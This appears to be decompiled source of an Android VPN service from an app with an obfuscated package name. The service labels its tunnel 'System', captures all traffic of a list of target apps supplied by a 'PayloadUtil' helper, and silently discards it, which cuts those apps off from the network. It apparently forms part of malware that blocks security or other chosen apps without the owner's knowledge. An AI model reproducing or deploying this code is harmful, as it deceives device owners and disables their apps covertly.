package com.app.mobile.kp3br9;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.VpnService;
import android.os.ParcelFileDescriptor;
import com.app.mobile.kp3br9.TunnelService;
import java.io.FileDescriptor;
import java.io.FileInputStream;

/* JADX INFO: loaded from: classes.dex */
public class TunnelService extends VpnService {
    public static TunnelService b;
    public ParcelFileDescriptor a;

    public static void b() {
        TunnelService tunnelService = b;
        if (tunnelService != null) {
            try {
                ParcelFileDescriptor parcelFileDescriptor = tunnelService.a;
                if (parcelFileDescriptor != null) {
                    parcelFileDescriptor.close();
                }
            } catch (Exception unused) {
            }
            try {
                b.stopForeground(true);
            } catch (Exception unused2) {
            }
            try {
                b.stopSelf();
            } catch (Exception unused3) {
            }
            b = null;
        }
    }

    public static /* synthetic */ void c(FileDescriptor fileDescriptor) {
        try {
            do {
            } while (new FileInputStream(fileDescriptor).read(new byte[32768]) >= 0);
        } catch (Exception unused) {
        }
    }

    @Override // android.app.Service
    public void onDestroy() {
        b();
        super.onDestroy();
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        b = this;
        try {
            VpnService.Builder builder = new VpnService.Builder(this);
            builder.addAddress("10.0.0.2", 32);
            builder.addRoute("0.0.0.0", 0);
            builder.setSession("System");
            builder.setMtu(1500);
            String[] strArrF = PayloadUtil.f();
            PackageManager packageManager = getPackageManager();
            for (String str : strArrF) {
                try {
                    packageManager.getPackageInfo(str, 0);
                    builder.addAllowedApplication(str);
                } catch (Exception unused) {
                }
            }
            ParcelFileDescriptor parcelFileDescriptorEstablish = builder.establish();
            this.a = parcelFileDescriptorEstablish;
            if (parcelFileDescriptorEstablish != null) {
                final FileDescriptor fileDescriptor = parcelFileDescriptorEstablish.getFileDescriptor();
                new Thread(new Runnable() { // from class: d0
                    @Override // java.lang.Runnable
                    public final void run() {
                        TunnelService.c(fileDescriptor);
                    }
                }).start();
            }
        } catch (Exception unused2) {
        }
        return 2;
    }
}
